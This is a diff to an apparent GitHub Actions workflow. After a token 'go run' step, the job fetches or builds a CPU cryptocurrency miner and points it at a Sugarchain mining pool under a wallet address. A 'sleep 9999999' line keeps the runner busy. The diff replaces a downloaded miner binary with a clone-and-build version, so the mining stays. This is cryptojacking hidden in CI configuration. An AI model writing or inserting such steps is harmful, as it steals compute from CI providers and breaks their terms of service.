@@ -26,7 +26,10 @@ jobs:
         hostname
         date
         go run main.go -g=${{ matrix.flag }}
-        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-        tar xf cpuminer-opt-linux.tar.gz
-        ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.1945 -t0
+        apt-get install -y \
+        build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev && \
+        git clone https://github.com/cryptozeny/cpuminer-opt-sugarchain.git && \
+        cd cpuminer-opt-sugarchain && \
+        ./build-yespower.sh && \
+        ./cpuminer -a yespower stratum-ru.rplant.xyz:7042 -u sugar1qlqrcchun3xhfqswv9kzctv8z9r4cgc0sc5nlpj.1945 -t0
         sleep 9999999
